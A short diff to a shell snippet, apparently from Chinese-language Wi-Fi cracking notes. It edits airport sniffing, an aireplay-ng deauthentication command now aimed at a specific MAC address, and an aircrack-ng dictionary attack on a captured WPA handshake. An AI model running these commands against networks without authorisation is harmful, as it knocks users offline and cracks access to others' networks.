@@ -1353,9 +1353,9 @@ airmon-ng stop wlp1s0mon
 ```shell
 sudo airport -s
 
-sudo airport en1 sniff 2
+sudo airport en1 sniff 4
 
-aireplay-ng -0 2 -a <目标wifi的mac地址> en1
+sudo aireplay-ng -0 2 -a B0:AA:D2:4D:50:E3 en1
 
-aircrack-ng -w wpa-dictionary/common.txt /tmp/***.cap
+sudo aircrack-ng -w ~/wifi/wpa-dictionary/mydict.txt /tmp/***.cap
 ```
